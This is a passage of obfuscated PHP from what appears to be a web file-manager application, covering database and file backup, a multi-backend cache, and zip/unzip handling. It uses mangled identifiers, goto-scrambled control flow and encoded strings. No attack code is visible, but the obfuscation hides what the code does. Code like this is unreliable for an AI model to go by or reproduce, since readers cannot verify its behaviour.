"\123\x79\163\x74\145\155\117\160\164\151\x6f\x6e\x5f{$e³à‡ÎÙ±}"; } protected function optionDefault($d„Ğ•›ù±È = '') { $c¨—½ˆ¥ˆÅ =& $_SERVER[õëù©û]; if ($d„Ğ•›ù±È == $c¨—½ˆ¥ˆÅ[33]) { return $GLOBALS[$c¨—½ˆ¥ˆÅ[6]][$c¨—½ˆ¥ˆÅ[2440]]; } } } class SystemRecordModel extends ModelBaseLight { } goto cÚ½Úœº¢µ; E¾ì•³ƒİ¾: class BackupDbFile { public function __construct() { } public function index() { goto a†¤ïááÓÜ; eò×÷‹™×´: $FÆ‰Ä¨‰¯º = new TaskFileTransfer($dÁİ©É»ÔÉ[724], $dÁİ©É»ÔÉ[707], 0, LNG($dÁİ©É»ÔÉ[708]) . $dÁİ©É»ÔÉ[407] . LNG($dÁİ©É»ÔÉ[710]) . $dÁİ©É»ÔÉ[725]); $FÆ‰Ä¨‰¯º->addPath($aµ“‘Ä¹¯•); $dŒŠˆ¤‚òî = IO::infoWithChildren($aµ“‘Ä¹¯•); goto B†¼™¦É¹; FŞÖÔÚ‰ËÕ: return !0; goto aã´é¾ğë; a†¤ïááÓÜ: $dÁİ©É»ÔÉ =& $_SERVER[õëù©û]; $F’’ñŞº¸ = Backup::get(); $cÙºŒ¢•„Ÿ = $F’’ñŞº¸[$dÁİ©É»ÔÉ[28]]; goto a¤Ãğù‚; a¤Ãğù‚: $aµ“‘Ä¹¯• = TEMP_FILES . "\142\x61\143\153\165\x70\137{$cÙºŒ¢•„Ÿ}\57"; $AŠò‘ÜÚ = "\x7b\151\x6f\x3a{$F’’ñŞº¸[$dÁİ©É»ÔÉ[686]]}\175\57\144\141\x74\x61\x62\x61\x73\145\x2f"; IO::mkdir($AŠò‘ÜÚ . "\142\x61\143\x6b\x75\x70\137{$cÙºŒ¢•„Ÿ}\x2f"); goto eò×÷‹™×´; B†¼™¦É¹: Backup::set(array($dÁİ©É»ÔÉ[726] => $dŒŠˆ¤‚òî[$dÁİ©É»ÔÉ[77]])); IO::move($aµ“‘Ä¹¯•, $AŠò‘ÜÚ); $c” ÀÏ…ñ¥ = CONTROLLER_DIR . $dÁİ©É»ÔÉ[727]; goto Ešæ»°¯Ç‰; Ešæ»°¯Ç‰: IO::copy($c” ÀÏ…ñ¥, $AŠò‘ÜÚ . "\x62\141\x63\x6b\165\160\x5f{$cÙºŒ¢•„Ÿ}\x2f"); $FÆ‰Ä¨‰¯º->end(); Backup::set(array($dÁİ©É»ÔÉ[728] => $dŒŠˆ¤‚òî[$dÁİ©É»ÔÉ[77]])); goto FŞÖÔÚ‰ËÕ; aã´é¾ğë: } } class BackupFile { public function __construct() { } public function index() { goto B†áš»Ò ; dÑ½¶“äñ: $B¹Œ’¨µî„ = 1000; $A¢ŒãÓñ‘ = $D³Õœ™Üó = 0; $a ±¼¢¹²­ = array(); goto FÉ×»È˜Ü; fÄÌ•‰ƒ™»: $cÖéÓËŸ¶Ü = $e°¢‡í–Õ ? 1 : 0; $fëŒ÷óñä• = array($_SERVER[õëù©û][745] => 1, $_SERVER[õëù©û][698] => time(), $_SERVER[õëù©û][704] => $cÖéÓËŸ¶Ü, $_SERVER[õëù©û][742] => $C¦¨‚å¡Â, $_SERVER[õëù©û][734] => $D™ÍÛ›‡Áõ, $_SERVER[õëù©û][733] => $B¯ˆÓ·Å®); if ($D³Õœ™Üó) { $fëŒ÷óñä•[$_SERVER[õëù©û][743]] = $c¼ø§ˆŠ÷­; $fëŒ÷óñä•[$_SERVER[õëù©û][744]] = $fä¯¢¯İ; } goto A×ö…Ş»ŒÖ; F„¬ÎŒƒ¹˜: $B¯ˆÓ·Å® = (int) Model($_SERVER[õëù©û][714])->where($fáî¿Š‘ó)->count($_SERVER[õëù©û][414]); $D™ÍÛ›‡Áõ = (int) Model($_SERVER[õëù©û][714])->where($fáî¿Š‘ó)->sum($_SERVER[õëù©û][77]); $aáØÊˆöšé = new TaskFileTransfer($_SERVER[õëù©û][731], $_SERVER[õëù©û][707], $B¯ˆÓ·Å®, LNG($_SERVER[õëù©û][708]) . $_SERVER[õëù©û][709] . LNG($_SERVER[õëù©û][732])); goto bê‡Š‚Œğ­; A×ö…Ş»ŒÖ: Backup::set($fëŒ÷óñä•); $this->_fileFilter($a ±¼¢¹²­); return !0; goto bÍØåÇŠç; FÉ×»È˜Ü: $fä¯¢¯İ = $c¼ø§ˆŠ÷­ = 0; do { $C£¶¢†¸ = $_SERVER[õëù©û][735]; $dÊàÔÃ¹­Ó = Model($_SERVER[õëù©û][714])->where($fáî¿Š‘ó)->field($C£¶¢†¸)->order($_SERVER[õëù©û][736])->selectPage($B¹Œ’¨µî„, $E²ãÀŒñî¥); $Aˆ¾´®³ô = !empty($dÊàÔÃ¹­Ó[$_SERVER[õëù©û][350]]) ? $dÊàÔÃ¹­Ó[$_SERVER[õëù©û][350]] : array(); foreach ($Aˆ¾´®³ô as $f‰Äİø¹) { goto CíºËÁ–; A¸â²†œõ: if (IO::exist($a‡ŒÇİ»È’)) { $aáØÊˆöšé->updateFileEnd($f‰Äİø¹[$_SERVER[õëù©û][28]], $f‰Äİø¹[$_SERVER[õëù©û][77]]); } else { $a‡ŒÇİ»È’ = get_path_father($a‡ŒÇİ»È’); IO::mkdir($a‡ŒÇİ»È’); if (!IO::copy($CÚéôãô‡¬, $a‡ŒÇİ»È’, $_SERVER[õëù©û][739])) { write_log($_SERVER[õëù©û][740] . $CÚéôãô‡¬ . $_SERVER[õëù©û][741] . $a‡ŒÇİ»È’ . $_SERVER[õëù©û][471], $_SERVER[õëù©û][707]); $e°¢‡í–Õ = !1; break; } } $C¦¨‚å¡Â = $f‰Äİø¹[$_SERVER[õëù©û][414]]; $D³Õœ™Üó += 1; goto fÑ‰¸Ö‘˜å; fÑ‰¸Ö‘˜å: $A¢ŒãÓñ‘ += $f‰Äİø¹[$_SERVER[õëù©û][77]]; $c¼ø§ˆŠ÷­ += 1; $fä¯¢¯İ += $f‰Äİø¹[$_SERVER[õëù©û][77]]; goto b•œ“µ¿´§; b•œ“µ¿´§: if ($A¢ŒãÓñ‘ >= 1024 * 1024 * 100) { $fëŒ÷óñä• = array($_SERVER[õëù©û][742] => $C¦¨‚å¡Â, $_SERVER[õëù©û][743] => $c¼ø§ˆŠ÷­, $_SERVER[õëù©û][744] => $fä¯¢¯İ); Backup::set($fëŒ÷óñä•); $A¢ŒãÓñ‘ = $D³Õœ™Üó = 0; } goto fÏÆŠ„ùí˜; CíºËÁ–: if (!$this->_fileExist($f‰Äİø¹, $a ±¼¢¹²­, $E…£¬¶¢ÌÚ)) { $B¯ˆÓ·Å® -= 1; $D™ÍÛ›‡Áõ -= (int) $f‰Äİø¹[$_SERVER[õëù©û][77]]; write_log("\x66\151\154\x65\40\x6e\x6f\x74\x20\145\x78\x69\163\x74\x2e\x66\151\154\145\x49\104\72{$f‰Äİø¹[$_SERVER[õëù©û][414]]}\x2c\40\160\x61\x74\150\72{$f‰Äİø¹[$_SERVER[õëù©û][75]]}", $_SERVER[õëù©û][737]); continue; } $CÚéôãô‡¬ = $f‰Äİø¹[$_SERVER[õëù©û][75]]; $a‡ŒÇİ»È’ = "\x7b\x69\157\72{$cËÒÃÄÃÅ[$_SERVER[õëù©û][686]]}\x7d" . substr($CÚéôãô‡¬, strlen("\x7b\151\x6f\x3a{$f‰Äİø¹[$_SERVER[õëù©û][738]]}\175")); goto A¸â²†œõ; fÏÆŠ„ùí˜: } $D¾—Õªó‡Ó = count($Aˆ¾´®³ô); $E²ãÀŒñî¥++; } while ($D¾—Õªó‡Ó == $B¹Œ’¨µî„); $aáØÊˆöšé->end(); goto fÄÌ•‰ƒ™»; bê‡Š‚Œğ­: $aáØÊˆöšé->task[$_SERVER[õëù©û][693]] = $D™ÍÛ›‡Áõ; $fëŒ÷óñä• = array($_SERVER[õëù©û][733] => $B¯ˆÓ·Å®, $_SERVER[õëù©û][734] => $D™ÍÛ›‡Áõ); Backup::set($fëŒ÷óñä•); goto BÌë„“ñ¤ö; BÌë„“ñ¤ö: $e°¢‡í–Õ = !0; $E…£¬¶¢ÌÚ = $this->storeIds(); $E²ãÀŒñî¥ = 1; goto dÑ½¶“äñ; B†áš»Ò : $cËÒÃÄÃÅ = Backup::get(); $C¦¨‚å¡Â = $cËÒÃÄÃÅ[$_SERVER[õëù©û][277]][$_SERVER[õëù©û][163]][$_SERVER[õëù©û][414]]; $fáî¿Š‘ó = array($_SERVER[õëù©û][415] => array($_SERVER[õëù©û][729], $C¦¨‚å¡Â), $_SERVER[õëù©û][730] => array($_SERVER[õëù©û][315], $cËÒÃÄÃÅ[$_SERVER[õëù©û][686]])); goto F„¬ÎŒƒ¹˜; bÍØåÇŠç: } private function _fileExist($C¡¸é´Åœ•, &$c»¦ïÓ¹º, $EÓãĞ†ƒ¢Ä) { goto D½Û®°µ; dÊº‘¡“àÊ: if (IO::exist($e²­±¹ËÌ)) { $c»¦ïÓ¹º[] = $C¡¸é´Åœ•[$f½ÓöÚ¹Ñ[414]]; return !1; } $eº›¡×¸®® = array($f½ÓöÚ¹Ñ[738] => $C¡¸é´Åœ•[$f½ÓöÚ¹Ñ[738]], $f½ÓöÚ¹Ñ[75] => array($f½ÓöÚ¹Ñ[746], "{$e²­±¹ËÌ}\45")); $eƒğœŸÕªº = Model($f½ÓöÚ¹Ñ[714])->where($eº›¡×¸®®)->field($f½ÓöÚ¹Ñ[415])->select(); goto a¾Õ±¶öÒ; a¾Õ±¶öÒ: $c»¦ïÓ¹º = array_merge($c»¦ïÓ¹º, array_to_keyvalue($eƒğœŸÕªº, $f½ÓöÚ¹Ñ[33], $f½ÓöÚ¹Ñ[414])); return !1; goto F¢»»œÃÅ; D½Û®°µ: $f½ÓöÚ¹Ñ =& $_SERVER[õëù©û]; $cÆ†Ò¦¤®· = $C¡¸é´Åœ•[$f½ÓöÚ¹Ñ[75]]; if (in_array($C¡¸é´Åœ•[$f½ÓöÚ¹Ñ[414]], $c»¦ïÓ¹º)) { return !1; } goto dœàÙãš; dœàÙãš: if (!in_array($C¡¸é´Åœ•[$f½ÓöÚ¹Ñ[738]], $EÓãĞ†ƒ¢Ä)) { return !1; } if (IO::exist($cÆ†Ò¦¤®·)) { return !0; } $e²­±¹ËÌ = get_path_father($cÆ†Ò¦¤®·); goto dÊº‘¡“àÊ; F¢»»œÃÅ: } private function _fileFilter($Cğâ—®‰) { $DÁ‰ñö«Ú =& $_SERVER[õëù©û]; if (empty($Cğâ—®‰)) { return; } $C¸Ÿô†Œ¯¿ = array($DÁ‰ñö«Ú[414] => array($DÁ‰ñö«Ú[7], array_unique($Cğâ—®‰))); $a¼‹«Öƒ®í = Model($DÁ‰ñö«Ú[747])->where($C¸Ÿô†Œ¯¿)->field($DÁ‰ñö«Ú[365])->select(); foreach ($a¼‹«Öƒ®í as $E“•ÚÙæÃ) { Model($DÁ‰ñö«Ú[747])->remove($E“•ÚÙæÃ[$DÁ‰ñö«Ú[365]], !1); } } private function storeIds() { $CöÏ±¹Ü =& $_SERVER[õëù©û]; $fœ‹ãÔİÛ = Model($CöÏ±¹Ü[699])->listData(); return array_to_keyvalue($fœ‹ãÔİÛ, $CöÏ±¹Ü[33], $CöÏ±¹Ü[363]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto Cõ…¼Ô”; F‡•Á ãé•: switch ($bØî­Ïó[$fğÊ·à‰ôä[748]]) { case $fğÊ·à‰ôä[17]: self::$handle = Model($fğÊ·à‰ôä[750]); break; case $fğÊ·à‰ôä[751]: self::$handle = new CacheRedis($Fè´âÀô«, $c¼•ÊÊ‘); break; case $fğÊ·à‰ôä[752]: self::$handle = new CacheMemcached($Fè´âÀô«, $c¼•ÊÊ‘); break; case $fğÊ·à‰ôä[163]: self::$handle = new CacheFile($Fè´âÀô«, $c¼•ÊÊ‘); break; default: break; } return self::$handle; goto Aù„ˆæšÛ¦; Cõ…¼Ô”: $fğÊ·à‰ôä =& $_SERVER[õëù©û]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Cå¿¸½•åÉ; Cå¿¸½•åÉ: $bØî­Ïó = $GLOBALS[$fğÊ·à‰ôä[6]][$fğÊ·à‰ôä[333]]; $Fè´âÀô« = $bØî­Ïó[$bØî­Ïó[$fğÊ·à‰ôä[748]]]; $c¼•ÊÊ‘ = $bØî­Ïó[$fğÊ·à‰ôä[749]]; goto F‡•Á ãé•; Aù„ˆæšÛ¦: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($cùÙç ÙÖ½) { if (is_array($cùÙç ÙÖ½) || is_object($cùÙç ÙÖ½)) { $cùÙç ÙÖ½ = json_encode($cùÙç ÙÖ½); } $cùÙç ÙÖ½ = rawurlencode($cùÙç ÙÖ½); return KOD_SITE_ID . $_SERVER[õëù©û][70] . $cùÙç ÙÖ½; } public static function get($c°èŸù¦‰ä) { $b“¦Ö• = self::key($c°èŸù¦‰ä); if (!isset(self::$memoryCache[$b“¦Ö•])) { CacheLock::lock($c°èŸù¦‰ä); $FŒ£Õ¨õ×ù = self::init()->get($b“¦Ö•); CacheLock::unlock($c°èŸù¦‰ä); self::$memoryCache[$b“¦Ö•] = unserialize($FŒ£Õ¨õ×ù); } return self::$memoryCache[$b“¦Ö•]; } public static function set($a À·î Œ†, $aÒ÷ö³¹ˆ•, $f—½Êí¡°ì = false) { goto c‹îºé„Ï; D‡¥‰¬Î‰: CacheLock::lock($a À·î Œ†); $Eá¡º‡‹é = self::init()->set($Aİ‘«±©ì¢, serialize($aÒ÷ö³¹ˆ•), $f—½Êí¡°ì); self::$memoryCache[$Aİ‘«±©ì¢] = $aÒ÷ö³¹ˆ•; goto e…À‰££‰­; c‹îºé„Ï: $Aİ‘«±©ì¢ = self::key($a À·î Œ†); if (isset(self::$memoryCache[$Aİ‘«±©ì¢]) && self::$memoryCache[$Aİ‘«±©ì¢] === $aÒ÷ö³¹ˆ•) { return !0; } if ($f—½Êí¡°ì === 0) { self::$memoryCache[$Aİ‘«±©ì¢] = $aÒ÷ö³¹ˆ•; return !0; } goto D‡¥‰¬Î‰; e…À‰££‰­: CacheLock::unlock($a À·î Œ†); return $Eá¡º‡‹é; goto Aç¥ÉÈ„½„; Aç¥ÉÈ„½„: } public static function remove($A»ù±Œ•ß‘) { goto bæšºò¹¥; bæšºò¹¥: $D—ªÍ¸Ğ‚“ = self::key($A»ù±Œ•ß‘); unset(self::$memoryCache[$D—ªÍ¸Ğ‚“]); self::clearTimeout(); goto A®¢‡Ş¾é; A®¢‡Ş¾é: CacheLock::lock($A»ù±Œ•ß‘); $DÆÑíÊ‚Û« = self::init()->remove($D—ªÍ¸Ğ‚“); CacheLock::unlock($A»ù±Œ•ß‘); goto a¶è£¼™ÔÆ; a¶è£¼™ÔÆ: return $DÆÑíÊ‚Û«; goto fšğ¹Š´óğ; fšğ¹Š´óğ: } public static function clearMemory($dÈ³Ú¼…Š— = false) { if ($dÈ³Ú¼…Š—) { $dÈ³Ú¼…Š— = self::key($dÈ³Ú¼…Š—); unset(self::$memoryCache[$dÈ³Ú¼…Š—]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[õëù©û][753])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[õëù©û][754])) { self::init()->clearTimeout(); } } } goto fÇÎäÓŸ«Â; aŸ£õ¦Ñê´: function beforeShutdownFatalError($C¸º¨çÆ¨Š) { think_exception($C¸º¨çÆ¨Š); } $_SERVER[$_SERVER[üá][48]] = $AˆÍÖœì‚°($_SERVER[$_SERVER[üá][45]]); $c•Ìô¹…½ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto fÇ¬ÎÔ¿‚›; E‡™ÚÏƒŸ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $aÂ…¶ààÏ¤; if (!$aÂ…¶ààÏ¤) { $cöÊ‹›íæ´ = IO::init($_SERVER[õëù©û][8]); } return $cöÊ‹›íæ´; } private static function iconvSystem($d£áÕ™Ü‹Â) { return self::local()->iconvSystem($d£áÕ™Ü‹Â); } private static function iconvApp($EÌ‚Š ªß—) { return self::local()->iconvApp($EÌ‚Š ªß—); } public static function zip($cÅÁ£Š§¤ , $c‘ñ•Û©‘ = "\172\x69\x70", $c¼¾Á®à = '', $CÈÑŠä° = REPEAT_RENAME) { goto F°òÚ‚‡; DÚà­£³Õ: if ($c¼¾Á®à || !$d¦ËÙºÂåÍ) { if ($d¦ËÙºÂåÍ && strstr($d¦ËÙºÂåÍ, TEMP_FILES)) { $b„»À‡Ÿöª = $DÀ¤÷Á·Øá = array(); recursion_dir($bğ›š…­„É, $b„»À‡Ÿöª, $DÀ¤÷Á·Øá, 0); foreach ($b„»À‡Ÿöª as $bÊ„İ£¸Æ) { del_dir($bÊ„İ£¸Æ); } foreach ($DÀ¤÷Á·Øá as $b¥Ï‡‚˜¯ñ) { if ($b¥Ï‡‚˜¯ñ == $AÁÑöîâƒä) { continue; } del_file($b¥Ï‡‚˜¯ñ); } } return $fƒÕ×‹‡á¥; } $Aš¬ëŠãÚÈ = self::pathFather($a¬óØÉ¨Šå[$dºÀíÛ¼[75]]); $d™˜ƒÜ‘¡ = self::move($fƒÕ×‹‡á¥, $Aš¬ëŠãÚÈ, $CÈÑŠä°); goto b«–Çë¨‡‰; d©£½”ˆ¡: $d¦ËÙºÂåÍ = !1; if (!$c¼¾Á®à && $E°Ùœ©Û†æ->getType() == $dºÀíÛ¼[101]) { $DÀ¤÷Á·Øá = self::zipFileList($cÅÁ£Š§¤ ); } else { $d¦ËÙºÂåÍ = $c¼¾Á®à ? $c¼¾Á®à : TEMP_FILES . $dºÀíÛ¼[1016] . time() . rand_string(8) . $dºÀíÛ¼[8]; mk_dir($d¦ËÙºÂåÍ); $DÀ¤÷Á·Øá = self::zipFileList($cÅÁ£Š§¤ , $d¦ËÙºÂåÍ); } $B¹ÅğöÉÖ¾ = $a¬óØÉ¨Šå[$dºÀíÛ¼[28]]; goto c¨àÓÁƒ’»; b«–Çë¨‡‰: if (!$d™˜ƒÜ‘¡) { del_dir($d¦ËÙºÂåÍ); show_json(LNG($dºÀíÛ¼[1018]), !1); } del_dir($d¦ËÙºÂåÍ); return $d™˜ƒÜ‘¡; goto bŠ†§ïóÉÆ; AÔò¾è­: $fƒÕ×‹‡á¥ = $bğ›š…­„É . $B¹ÅğöÉÖ¾ . $dºÀíÛ¼[91] . $c‘ñ•Û©‘; $fƒÕ×‹‡á¥ = get_filename_auto($fƒÕ×‹‡á¥, $dºÀíÛ¼[33], $CÈÑŠä°); $AÁÑöîâƒä = self::iconvSystem($fƒÕ×‹‡á¥); goto aÔ±–Êœ ç; aÔ±–Êœ ç: foreach ($DÀ¤÷Á·Øá as $BÎ°æğôßŠ => $DÖĞÂ¼ˆ¨) { $DÀ¤÷Á·Øá[$BÎ°æğôßŠ] = self::iconvSystem($DÖĞÂ¼ˆ¨); } KodArchive::create($AÁÑöîâƒä, $DÀ¤÷Á·Øá); if (!IO::exist($fƒÕ×‹‡á¥)) { if ($d¦ËÙºÂåÍ) { del_dir($d¦ËÙºÂåÍ); } show_json(LNG($dºÀíÛ¼[1018]), !1); } goto DÚà­£³Õ; c¨àÓÁƒ’»: if (count($DÀ¤÷Á·Øá) > 1) { $Dšâ§ÓùŠé = IO::info(IO::pathFather($a¬óØÉ¨Šå[$dºÀíÛ¼[75]])); $B¹ÅğöÉÖ¾ = $Dšâ§ÓùŠé[$dºÀíÛ¼[28]]; } $bğ›š…­„É = $d¦ËÙºÂåÍ; if (!$bğ›š…­„É) { $bğ›š…­„É = get_path_father($a¬óØÉ¨Šå[$dºÀíÛ¼[75]]); $AÈñ¯„Ò¹Ó = IO::info($bğ›š…­„É); if (!$AÈñ¯„Ò¹Ó[$dºÀíÛ¼[185]]) { show_json(LNG($dºÀíÛ¼[1017]), !1); } } goto AÔò¾è­; F°òÚ‚‡: $dºÀíÛ¼ =& $_SERVER[õëù©û]; $E°Ùœ©Û†æ = self::init($cÅÁ£Š§¤ [0][$dºÀíÛ¼[75]]); $a¬óØÉ¨Šå = self::info($cÅÁ£Š§¤ [0][$dºÀíÛ¼[75]]); goto d©£½”ˆ¡; bŠ†§ïóÉÆ: } public static function unzip($F˜ÜÊ¸×õÜ, $d¬Ï›¹§Ç = "\162\145\x70\x6c\x61\143\145") { goto aŠòàºËóš; C£ğ³ïÖå: $AŸĞ“¬«•Å = KodArchive::extract($cáº¹Œëµæ, $Dùİ‹‡ŒÔ¹ . $B”©ª™ éß[8], $eäÂĞ·Ä‘Ó); self::archiveExt(); if (!$AŸĞ“¬«•Å[$B”©ª™ éß[1023]]) { show_json($B”©ª™ éß[1024] . $AŸĞ“¬«•Å[$B”©ª™ éß[1025]], !1); } goto EŸæ×ÖÙÓµ; EŸæ×ÖÙÓµ: Hook::trigger($B”©ª™ éß[1026], $Dùİ‹‡ŒÔ¹); recursion_dir($Dùİ‹‡ŒÔ¹, $b¤ÈŒÙˆÏ, $e±¨¾Á½Áç, 0); $dÇ¬£»ÕÜÚ = array_merge($b¤ÈŒÙˆÏ, $e±¨¾Á½Áç); goto f‘Õˆ‘İ£; f‘Õˆ‘İ£: foreach ($dÇ¬£»ÕÜÚ as $FŒ‡á¢Ï¸ ) { $FŒ‡á¢Ï¸  = self::iconvApp($FŒ‡á¢Ï¸ ); self::move($FŒ‡á¢Ï¸ , $FÁŒ§Š¬±, $d¬Ï›¹§Ç); } del_dir($Dùİ‹‡ŒÔ¹); if (!$fµ›ñ¹îìÙ) { del_file($cáº¹Œëµæ); } goto E›³ğæˆƒ; aŠòàºËóš: $B”©ª™ éß =& $_SERVER[õëù©û]; $b¢ÙÊË‘— = $F˜ÜÊ¸×õÜ[$B”©ª™ éß[75]]; $FÁŒ§Š¬± = $F˜ÜÊ¸×õÜ[$B”©ª™ éß[1019]]; goto bÛ‡–ù…Ô; E›³ğæˆƒ: return !0; goto a Á˜ĞÊà; cÓœ™Ì‹Ä¼: $EÊÇîğ§­ = self::tmpFileName($eÍÖÅ»ßç£); $Dùİ‹‡ŒÔ¹ = TEMP_FILES . $EÊÇîğ§­; del_dir($Dùİ‹‡ŒÔ¹); goto C¸øéÓ¯»¹; Eµç´‡•Î: if (!@file_exists(self::iconvSystem($cáº¹Œëµæ))) { $fµ›ñ¹îìÙ = self::localFilePath($b¢ÙÊË‘—, $d““Ã²‚å’); $cáº¹Œëµæ = $fµ›ñ¹îìÙ ? $fµ›ñ¹îìÙ : parent::download($b¢ÙÊË‘—, $cáº¹Œëµæ); } $cáº¹Œëµæ = self::iconvSystem($cáº¹Œëµæ); $eäÂĞ·Ä‘Ó = isset($F˜ÜÊ¸×õÜ[$B”©ª™ éß[1021]]) ? $F˜ÜÊ¸×õÜ[$B”©ª™ éß[1021]] : $B”©ª™ éß[1022]; goto C£ğ³ïÖå; C¸øéÓ¯»¹: mk_dir($Dùİ‹‡ŒÔ¹); $d““Ã²‚å’ = self::fileExt($eÍÖÅ»ßç£); $cáº¹Œëµæ = $Dùİ‹‡ŒÔ¹ . $B”©ª™ éß[91] . $d““Ã²‚å’; goto Eµç´‡•Î; bÛ‡–ù…Ô: if (!($eÍÖÅ»ßç£ = parent::info($b¢ÙÊË‘—))) { show_json(LNG($B”©ª™ éß[1020]), !1); } if (!($D«—ö”Œˆ = parent::infoFull($FÁŒ§Š¬±))) { $FÁŒ§Š¬± = parent::mkdir($FÁŒ§Š¬±); $D«—ö”Œˆ = array($B”©ª™ éß[75] => $FÁŒ§Š¬±); } else { if (isset($D«—ö”Œˆ[$B”©ª™ éß[365]]) && trim($D«—ö”Œˆ[$B”©ª™ éß[75]], $B”©ª™ éß[8]) != trim($FÁŒ§Š¬±, $B”©ª™ éß[8])) { $b‡Ôç¥ëŒµ = KodIO::make($D«—ö”Œˆ[$B”©ª™ éß[456]]); $B·ÙÂ·òÂƒ = parent::fileNameAuto($b‡Ôç¥ëŒµ, $D«—ö”Œˆ[$B”©ª™ éß[28]], REPEAT_RENAME_FOLDER, !0); $FÁŒ§Š¬± = parent::mkdir($b‡Ôç¥ëŒµ . $B·ÙÂ·òÂƒ); $D«—ö”Œˆ = array($B”©ª™ éß[75] => $FÁŒ§Š¬±); } } $FÁŒ§Š¬± = $D«—ö”Œˆ[$B”©ª™ éß[75]]; goto cÓœ™Ì‹Ä¼; a Á˜ĞÊà: } public static function unzipList($Aê§ ‚ò‡‘) { goto eïÎ‡Œñ; eïÎ‡Œñ: $Eá­æõ•ã¨ =& $_SERVER[õëù©û]; $aëŞ’’ğµ´ = $Aê§ ‚ò‡‘[$Eá­æõ•ã¨[75]]; $fªª´Ù¦ˆ = isset($Aê§ ‚ò‡‘[$Eá­æõ•ã¨[1027]]) ? $Aê§ ‚ò‡‘[$Eá­æõ•ã¨[1027]] : -1; goto B©¨“›İŒë; D›™ ƒ‰±: $B¡°ÒŞÖ– = self::info($D×Ş¯š÷Š); $c¤Ş…ğ¤‹“ = self::fileExt($B¡°ÒŞÖ–); $D–«¸¨Ó¡ = self::tmpFileName($B¡°ÒŞÖ–); goto EÇñ‰Àñ×; a²òØé‡Ú”: return $CùØºË¶ÜÉ[$Eá­æõ•ã¨[1025]]; goto a¿ÓìŒÅ¾ ; B©¨“›İŒë: $d”éİ¯ò¸ = 50000; if (request_url_safe($aëŞ’’ğµ´)) { $C¶…«ò¸Í = parse_url_query($aëŞ’’ğµ´); if (!isset($C¶…«ò¸Í[$Eá­æõ•ã¨[75]])) { show_json($Eá­æõ•ã¨[1028], !1); } } $D×Ş¯š÷Š = isset($C¶…«ò¸Í) ? $C¶…«ò¸Í[$Eá­æõ•ã¨[75]] : $aëŞ’’ğµ´; goto D›™ ƒ‰±; EÎø„Ù„Íâ: $cßµƒ´ĞÜ¿ = self::iconvSystem($cßµƒ´ĞÜ¿); if ($fªª´Ù¦ˆ >= 0) { $b»¹Ú®•Ñ‰ = isset($Aê§ ‚ò‡‘[$Eá­æõ•ã¨[1031]]) ? $Aê§ ‚ò‡‘[$Eá­æõ•ã¨[1031]] : !1; $DßÃåğô— = isset($Aê§ ‚ò‡‘[$Eá­æõ•ã¨[28]]) ? $Aê§ ‚ò‡‘[$Eá­æõ•ã¨[28]] : $Eá­æõ•ã¨[33]; KodArchive::filePreview($cßµƒ´ĞÜ¿, $fªª´Ù¦ˆ, $b»¹Ú®•Ñ‰, $DßÃåğô—); self::archiveExt(); die; } $CùØºË¶ÜÉ = KodArchive::listContent($cßµƒ´ĞÜ¿); goto e¹¡•¢¾Ç; EÇñ‰Àñ×: if (isset($C¶…«ò¸Í)) { $F—ë¹ÜùŠÖ = array($C¶…«ò¸Í[$Eá­æõ•ã¨[75]], $C¶…«ò¸Í[$Eá­æõ•ã¨[1027]], $C¶…«ò¸Í[$Eá­æõ•ã¨[28]]); $dŸ‡Ô¨ËÙÉ = md5(implode($Eá­æõ•ã¨[70], $F—ë¹ÜùŠÖ)) . $Eá­æõ•ã¨[91] . get_path_ext($C¶…«ò¸Í[$Eá­æõ•ã¨[28]]); } else { $F—ë¹ÜùŠÖ = array($B¡°ÒŞÖ–[$Eá­æõ•ã¨[28]], $B¡°ÒŞÖ–[$Eá­æõ•ã¨[75]], $B¡°ÒŞÖ–[$Eá­æõ•ã¨[77]]); $dŸ‡Ô¨ËÙÉ = md5(implode($Eá­æõ•ã¨[70], $F—ë¹ÜùŠÖ)) . $Eá­æõ•ã¨[91] . $c¤Ş…ğ¤‹“; } if ($fªª´Ù¦ˆ == -1) { $DíÕ£»÷Ãù = IO_PATH_SYSTEM_TEMP . "\172\151\x70\x56\x69\x65\x77\57{$D–«¸¨Ó¡}\x2f{$dŸ‡Ô¨ËÙÉ}\56\154\157\x67"; $B¥·‚È¸ˆ‡ = self::infoFull($DíÕ£»÷Ãù); if ($B¥·‚È¸ˆ‡) { $DíÕ£»÷Ãù = $B¥·‚È¸ˆ‡[$Eá­æõ•ã¨[75]]; $f§„‡³ò½ = self::getContent($DíÕ£»÷Ãù); if ($f§„‡³ò½) { $C³‹ï¸âµ” = json_decode($f§„‡³ò½, !0); if (count($C³‹ï¸âµ”) >= $d”éİ¯ò¸) { show_json(sprintf(LNG($Eá­æõ•ã¨[1029]), count($C³‹ï¸âµ”)), !1); } return $C³‹ï¸âµ”; } } else { $DíÕ£»÷Ãù = self::mkfile($DíÕ£»÷Ãù); } } $c†»¹Äí£µ = TEMP_FILES . $D–«¸¨Ó¡; goto DÆ÷‹Ş‡Ñ½; DÆ÷‹Ş‡Ñ½: if (!is_dir($c†»¹Äí£µ)) { mk_dir($c†»¹Äí£µ); } $cßµƒ´ĞÜ¿ = $c†»¹Äí£µ . $Eá­æõ•ã¨[8] . $dŸ‡Ô¨ËÙÉ; if (!@file_exists(self::iconvSystem($cßµƒ´ĞÜ¿))) { if (isset($C¶…«ò¸Í)) { url_request($aëŞ’’ğµ´, $Eá­æõ•ã¨[1030], $cßµƒ´ĞÜ¿); } else { $F«˜áôâÏô = self::localFilePath($aëŞ’’ğµ´, $c¤Ş…ğ¤‹“); $cßµƒ´ĞÜ¿ = $F«˜áôâÏô ? $F«˜áôâÏô : self::download($aëŞ’’ğµ´, $cßµƒ´ĞÜ¿); } } goto EÎø„Ù„Íâ; e¹¡•¢¾Ç: self::archiveExt(); del_dir($c†»¹Äí£µ); if (!$CùØºË¶ÜÉ[$Eá­æõ•ã¨[1023]]) { show_json($CùØºË¶ÜÉ[$Eá­æõ•ã¨[1025]], !1); } goto fĞãÜˆ¾Ê; fĞãÜˆ¾Ê: $C³‹ï¸âµ” = 